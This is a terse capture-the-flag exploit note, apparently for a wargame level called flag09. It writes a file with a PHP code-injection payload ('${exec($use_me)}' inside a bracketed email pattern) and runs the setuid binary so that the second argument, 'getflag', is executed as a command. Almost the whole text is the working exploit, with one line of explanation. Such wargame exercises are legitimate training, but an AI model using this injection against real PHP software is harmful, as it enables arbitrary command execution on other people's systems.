create file at /tmp

$ echo '[email {${exec($use_me)}}]'> /tmp/file.txt
$ ./flag09 /tmp/file.txt getflag

"getflag" passed as the second param, into the $use_me var